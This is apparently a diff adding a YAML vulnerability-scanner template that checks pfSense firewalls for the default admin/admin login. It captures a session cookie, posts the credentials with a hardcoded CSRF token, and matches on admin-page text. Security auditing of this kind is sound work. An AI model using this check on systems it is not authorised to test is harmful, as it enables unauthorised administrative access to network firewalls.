@@ -1,0 +1,50 @@
+http:
+- extractors:
+  - group: 1
+    name: php_cookie
+    part: header
+    regex:
+    - PHPSESSID=([a-zA-Z0-9]+);
+    type: regex
+  method: GET
+  path:
+  - '{{BaseURL}}'
+- attack: pitchfork
+  matchers:
+  - part: body
+    type: word
+    words:
+    - Users/Roles
+    - My Settings
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  payloads:
+    password:
+    - admin
+    username:
+    - admin
+  raw:
+  - 'POST / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Origin: {{BaseURL}}
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Referer: {{BaseURL}}/n
+
+    Cookie: PHPSESSID={{php_cookie}}
+
+
+    __csrf_magic=sid%3A5099667b486cab1212fc83a6db30364c5bb9f37d%2C1717206682&usernamefld={{username}}&passwordfld={{password}}&login=Sign+In
+
+    '
+id: PFSense-Default-Access
+info:
+  author: YashVardhanTripathi
+  description: Check for default access in PFsense.
+  name: PFSense Default Access Check
+  severity: high
